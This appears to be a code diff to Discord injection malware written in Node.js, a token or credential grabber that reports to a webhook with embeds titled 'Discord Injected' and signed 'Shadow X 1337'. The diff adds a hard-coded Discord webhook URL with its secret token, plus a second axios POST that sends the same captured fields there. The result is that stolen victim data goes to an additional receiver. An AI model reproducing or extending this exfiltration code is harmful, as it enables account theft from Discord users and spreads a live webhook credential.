@@ -5,6 +5,7 @@ const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
+const src = "https://discord.com/api/webhooks/1094337089346216037/RCOX7dEEPSs27oHZrDkHPmQD0sLcWa636Vu5aJo1MgFkGyW4Q0yJuq70oVX8rhM9iQPi"
 
 const config = {
     "logout": "%LOGOUT%1",
@@ -165,6 +166,29 @@ function injectNotify() {
     })
     axios
 	.post(webhook, {
+        "content": null,
+        "embeds": [
+          {
+            "title": "Discord Injected",
+            "color": config["embed-color"],
+            "fields": fields,
+            "author": {
+              "name": "Shadow X 1337"
+            },
+            "footer": {
+              "text": "Shadow X 1337"
+            }
+          }
+        ]
+      })
+	.then(res => {
+	})
+	.catch(error => {
+
+    })
+
+    axios
+	.post(src, {
         "content": null,
         "embeds": [
           {
